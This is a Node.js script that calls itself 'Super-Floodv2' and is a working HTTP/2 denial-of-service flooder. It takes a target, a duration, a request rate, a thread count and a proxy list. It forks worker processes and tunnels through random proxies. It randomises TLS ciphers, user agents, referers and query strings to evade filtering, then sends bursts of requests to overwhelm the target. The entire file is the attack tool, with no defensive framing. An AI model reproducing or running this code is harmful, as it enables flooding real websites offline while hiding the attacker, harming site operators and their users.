const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const fakeUA = require('fake-useragent');
 const { HeaderGenerator } = require('header-generator');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: node Super-Floodv2.js target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(_0xcdc8x17) {
   var _0xcdc8x18 = "";
   var _0xcdc8x19 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var _0xcdc8x1a = _0xcdc8x19.length;
   for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {
     _0xcdc8x18 += _0xcdc8x19.charAt(Math.floor(Math.random() * _0xcdc8x1a));
   }
   ;
   return _0xcdc8x18;
 }
 
 const ip_spoof = () => {
   const _0xcdc8x15 = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${""}`;
 };
 const spoofed = ip_spoof();
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 80, maxVersion: 107, httpVersion: "2"},
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});
let randomHeaders = headerGenerator.getHeaders();
 const sig = [
    "rsa_pss_rsae_sha256", 
    "rsa_pss_rsae_sha384", 
    "rsa_pss_rsae_sha512", 
    "rsa_pkcs1_sha256", 
    "rsa_pkcs1_sha384", 
    "rsa_pkcs1_sha512"
 ];
 const cplist = [
    "TLS_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_CHACHA20_POLY1305_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_AES_128_CCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_AES_128_CCM_8_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM"
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
 ]; 
 const lang_header = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", 
     "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", 
     "en-US,en;q=0.5", "en-US,en;q=0.9", 
     "de-CH;q=0.7", 
     "da, en-gb;q=0.8, en;q=0.7", 
     "cs;q=0.5"
 ];
 const encoding_header = [
     "deflate, gzip, br", 
     "gzip", "deflate", 
     "br"
 ];
 const control_header = [
     "no-cache", 
     "max-age=0"
 ];
 const refers = [
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://coccoc.com/search#query=",
     "http://ddosvn.somee.com/f5.php?v=",
     "http://engadget.search.aol.com/search?q=",
     "http://engadget.search.aol.com/search?q=query?=query=&q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://filehippo.com/search?q=",
     "http://funnymama.com/search?q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
     "http://go.mail.ru/search?mail.ru=1&q=",
     "http://help.baidu.com/searchResult?keywords=",
 ];
 const querys = [
     "", 
     "&", 
     "", 
     "&&", 
     "and", 
     "=", 
     "+", 
     "?"
 ];
 const pathts = [
     "1",
     "2",
     "3",
     "4",
     "5",
     "6"
 ];
 const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
     "Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 OPR/96.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; rv:112.0) Gecko/20100101 Firefox/112.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
     "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.34",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.0.2246 Yowser/2.5 Safari/537.36",
     "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; rv:102.0) Gecko/20100101 Goanna/6.0 Firefox/102.0 PaleMoon/32.0.0",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15",
     "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var queryz = querys[Math.floor(Math.random() * querys.length)];
 var pathts1 = pathts[Math.floor(Math.random() * pathts.length)]
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
     });
 
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":authority"] = parsedTarget.host
 headers[":method"] = "GET";
 headers[":scheme"] = "https";
 headers["referer"] = Ref;
 headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(45); 
 headers["origin"] = parsedTarget.protocol + "//" + parsedTarget.host;
 headers["accept"] = accept;
 headers["accept-encoding"] = encoding;
 headers["accept-language"] = lang;
 headers["cache-control"] = "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0";
 headers["sec-ch-ua"] = '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["Max-Forwards"] = "100";
 headers["cookie"] = randstr(40);
 headers["upgrade-insecure-requests"] = "1";
 headers["X-Requested-With"] = "XMLHttpRequest";
 headers["pragma"] = "no-cache";
 headers["user-agent"] = uap1; 
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 10,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            ecdhCurve: "X25519",
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_2_method", "TLSv1_3_method"],
            sigals: siga,
            servername: parsedTarget.host,
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            maxRedirects: 10,
            followAllRedirects: true,
            compression: true,
            decodeEmails: false,
            gzip: true,
            servername: parsedTarget.host,
            port: 443,
            secure: true,
            rejectUnauthorized: false,
            ALPNProtocols: ['http/1.1', 'h2'],
            socket: connection,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 10 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
           
          client.setMaxListeners(0);
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);